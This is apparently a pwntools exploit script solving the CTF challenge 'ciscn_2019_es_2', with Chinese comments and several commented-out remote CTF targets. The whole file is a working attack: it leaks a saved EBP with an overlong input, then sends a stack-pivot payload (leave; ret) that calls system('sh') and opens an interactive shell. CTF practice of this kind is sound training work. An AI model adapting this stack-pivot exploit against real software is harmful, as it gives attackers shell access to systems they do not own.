from pwn import *





#p = remote('node4.buuoj.cn',28481)

p = process("./ciscn_2019_es_2")
#p=gdb.debug("./ciscn_2019_es_2","break main")
elf = ELF("./ciscn_2019_es_2")



#remote_target = "1node4.buuoj.cn:28244"  # 远程目标的 IP 地址和端口号
#remote_target = "17.21.200.166:28244" 

# 连接远程目标并设置断点
#p = gdb.debug(["./ciscn_2019_es_2"], gdbscript="break main", exe=remote_target)


#gdb.attach(p, '''
#    break vul
#    break *0x08048610
#    break *0x0804861D
#    break main
#''')
#pause()
#p.debug("DEBUG")
#p.breakpoint('main')
#gdb.attach(p, "b *0x08048610")
context.log_level='debug'
#gdb.attach(p)
sys_addr = 0x8048400
system_addr = elf.sym['system']
leave_ret = 0x080484b8
payload = b'a' * 0x27 + b'p'
p.recvuntil(b'name?\n')
p.send(payload)
p.recvuntil(b'p')
ebp = u32(p.recv(4))
print(hex(ebp))
#payload = (b'this'+p32(system_addr)+p32(system_addr)+p32(ebp-0x28)+b'/bin/sh\x00').ljust(0x28,b'p')+p32(ebp-0x38) + p32(leave_ret)
payload = (b'this'+p32(system_addr)+p32(system_addr)+p32(ebp-0x28)+b'sh\x00').ljust(0x28,b'p')+p32(ebp-0x38) + p32(leave_ret)
                                      #指向'/bin/sh' 								#指向this,也就是我们栈劫持的地方
p.send(payload)
p.interactive()

